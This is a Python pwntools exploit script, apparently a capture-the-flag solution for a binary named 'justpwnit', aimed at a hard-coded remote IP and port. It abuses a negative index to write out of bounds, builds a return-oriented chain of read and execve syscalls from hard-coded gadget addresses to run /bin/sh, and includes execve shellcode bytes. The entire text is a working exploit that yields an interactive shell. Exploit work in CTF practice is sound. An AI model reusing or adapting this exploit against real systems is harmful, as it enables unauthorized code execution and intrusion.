from pwn import *

r = remote("168.119.108.148", 11010)

#r = process("./justpwnit")
#gdb.attach(r)


pop_rax_ret = 0x0000000000401001
pop_rdi_ret = 0x0000000000401b0d
pop_rsi_ret = 0x00000000004019a3
pop_rdx_ret = 0x0000000000403d23
syscall = 0x00000000004013e9
syscall_ret = 0x404b3d
bss = 0x0040b500

def senddata(index, data):
	r.sendline(str(index))
	r.recvuntil(b'Data:')
	r.sendline(data)

shell_execve = "\x48\xBF\x2F\x62\x69\x6E\x2F\x73\x68\x00\x57\x48\x89\xE7\x48\x31\xF6\x48\x31\xD2\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05"

payload = "a"*(0x80-1)
senddata(1, payload)

payload = "b"*(0x80-1)
senddata(1, payload)

payload = "c"*(0x80-1)
senddata(2, payload)

#payload = "d"*(0x80-1)
payload = p64(0)
payload += p64(pop_rax_ret) + p64(0)
payload += p64(pop_rdi_ret) + p64(0)
payload += p64(pop_rsi_ret) + p64(bss)
#payload += p64(pop_rdx_ret) + p64(0x100)
payload += p64(syscall_ret)

payload += p64(pop_rax_ret) + p64(59)
payload += p64(pop_rdi_ret) + p64(bss)
payload += p64(pop_rsi_ret) + p64(0)
#payload += p64(pop_rdx_ret) + p64(0)
payload += p64(syscall_ret)

print(hex(len(payload)))

senddata(-2, payload)

r.sendline(b"/bin/sh\x00")


r.interactive()